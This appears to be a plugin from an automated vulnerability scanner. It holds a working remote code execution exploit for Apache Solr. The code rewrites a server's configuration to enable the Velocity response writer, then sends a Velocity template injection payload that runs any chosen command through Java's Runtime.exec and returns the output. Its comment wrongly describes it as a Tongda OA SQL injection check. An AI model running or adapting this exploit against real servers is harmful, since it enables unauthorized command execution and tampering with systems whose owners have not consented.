import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#通达 OA 系统 SQL 注入漏洞
plugin_id=49
default_port_list=[80,443,8080,8983]


def is_solr(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/solr/admin/cores?wt=json', '/admin/cores?wt=json']
    hits = [',"instanceDir":"/']
    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=10, verify=False)
                for hit in hits:
                    if hit in response.text:

                        return True, response
    except Exception as error:
        return False
    return False


def config(url):
    """
    Set "params.resource.loader.enabled" as true.

    :param url:
    :return:
    """
    url = '{}/config'.format(url)
    data = {
        "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    requests.post(url=url, json=data, verify=False)


def rce(url, cmd):
    url = '{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(
        url, cmd)
    response = requests.get(url, verify=False)
    return response


def get_cores(host, port=80):
    check_is_solr = is_solr(host, port)
    if check_is_solr:
        _, response = check_is_solr
        if '/solr/' in response.url:
            solr_uri = '/solr/'
        else:
            solr_uri = '/'
        cores = ['{}{}'.format(solr_uri, core) for core in response.json().get('status').keys()]
        return cores
    else:
        return []


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    hits = ['solr-webapp']

    try:
        uris = get_cores(host, port)
        if len(uris):
            targets = ['{}{}'.format(target, uri) for uri in uris]
            for target in targets:
                config(target)
                response = rce(target, 'dir')
                for hit in hits:
                    if hit in response.text:
                        output = response.text
                        insert_vuln_db(host, target, target, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False